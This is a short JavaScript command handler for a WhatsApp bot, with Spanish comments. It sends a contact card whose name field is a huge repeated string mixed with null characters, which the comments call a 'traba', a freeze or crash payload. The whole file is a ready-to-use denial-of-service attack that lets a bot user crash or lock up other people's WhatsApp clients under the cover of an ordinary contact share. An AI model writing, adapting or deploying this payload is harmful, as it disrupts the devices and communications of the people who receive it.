let handler = async (m, { conn }) => {
  const number = '521234567890'; // Número del contacto

  const basura = '꧅+𝑩𝑨𝑺𝑼𝑹𝑨꧅'.repeat(9000); // Traba base
  const invisible = '\u0000'; // Carácter invisible

  // Combinar basura + invisible en distintos bloques
  const trabaFinal = basura + invisible + basura + invisible + basura;

  const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:${trabaFinal}
TEL;type=CELL;type=VOICE;waid=${number}:${number}
END:VCARD
  `.trim();

  await conn.sendMessage(m.chat, {
    contacts: {
      displayName: basura + invisible + basura + invisible + basura, // Se ve como nombre del contacto
      contacts: [{ vcard }]
    }
  }, { quoted: m });
};

handler.command = /^contacto$/i;
export default handler;
